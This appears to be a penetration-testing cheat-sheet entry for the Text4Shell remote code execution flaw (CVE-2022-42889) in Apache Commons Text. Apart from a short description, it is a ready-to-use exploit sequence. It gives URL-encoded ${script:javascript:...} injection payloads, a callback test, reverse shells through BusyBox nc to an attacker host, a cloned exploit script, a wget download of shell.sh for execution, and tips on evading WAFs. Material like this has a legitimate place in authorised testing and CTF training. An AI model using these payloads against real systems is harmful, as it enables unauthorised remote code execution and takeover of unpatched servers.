title: Text4Shell — CVE-2022-42889 (Apache Commons Text RCE)
body: Text4Shell is a remote code execution vulnerability in Apache Commons Text < 1.10.0. The library's `StringSubstitutor` processes string interpolation including script lookups — passing `${script:javascript:...}` into any user-controlled input that gets processed by the library triggers OS command execution. Fingerprint: Java stack in a web app, look for Commons Text in error traces or JAR listings. Affects any app that passes user input to StringSubstitutor.substitute().
cmd:
# ══════════════════════════════════════════════════
# 1 — FINGERPRINT
# ══════════════════════════════════════════════════
# Java app with user-supplied string processing
# Error traces mentioning: org.apache.commons.text
# Version check (if you have shell access):
find / -name 'commons-text-*.jar' 2>/dev/null
# Vulnerable: < 1.10.0

# ══════════════════════════════════════════════════
# 2 — TEST (confirm RCE with callback)
# ══════════════════════════════════════════════════
# Start listener on Kali: python3 -m http.server 80
# Then inject via URL parameter:
curl 'http://<IP>:8080/search?query=$%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27curl+<LHOST>%2Ftest%27%29%7D'
# Hit = vulnerable

# ══════════════════════════════════════════════════
# 3 — EXPLOIT: reverse shell
# ══════════════════════════════════════════════════
# Method A — BusyBox nc (most reliable on minimal Linux):
curl 'http://<IP>:8080/search?query=$%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27busybox+nc+<LHOST>+<LPORT>+-e+/bin/sh%27%29%7D'

# Method B — Python exploit:
git clone https://github.com/kljunowsky/CVE-2022-42889-text4shell
python3 exploit.py -u 'http://<IP>:8080/search?query=' -m rce -c 'busybox nc <LHOST> <LPORT> -e /bin/sh'

# Method C — wget download + exec:
curl "http://<IP>:8080/search?query=%0A%0A%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27wget+http%3A%2F%2F<LHOST>%2Fshell.sh+-O+/tmp/s%27%29%7D"
# then: exec of /tmp/s

# Listener on Kali:
nc -lvnp <LPORT>
warn: The URL-encoded payload is the reliable form — raw ${script:javascript:...} may get filtered by WAFs or URL parsers. Busybox nc works on minimal containers where standard nc lacks -e. This only fires when Commons Text processes the input — not all parameters are processed by StringSubstitutor. Try multiple injection points: query params, headers, POST body fields.
